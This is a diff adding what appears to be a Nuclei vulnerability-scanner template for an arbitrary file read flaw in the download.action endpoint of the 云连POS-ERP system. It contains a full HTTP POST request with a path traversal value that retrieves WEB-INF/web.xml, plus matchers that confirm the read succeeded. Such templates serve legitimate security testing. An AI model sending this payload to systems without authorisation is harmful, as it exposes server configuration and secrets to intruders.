@@ -1,0 +1,35 @@
+id: yunlian-pos-erp-download-action-anyfile-read
+info:
+  name: 云连POS-ERP管理系统 download.action 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    云连POS-ERP管理系统 download.action 任意文件读取漏洞 allows attackers to read arbitrary files on the server by exploiting improper path handling.
+
+http:
+  - raw:
+      - |
+        POST /admin/file!download.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        downloadFile=../../WEB-INF/web.xml
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<display-name>"
+      - type: word
+        part: header
+        words:
+          - "filename=../../WEB-INF/web.xml"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
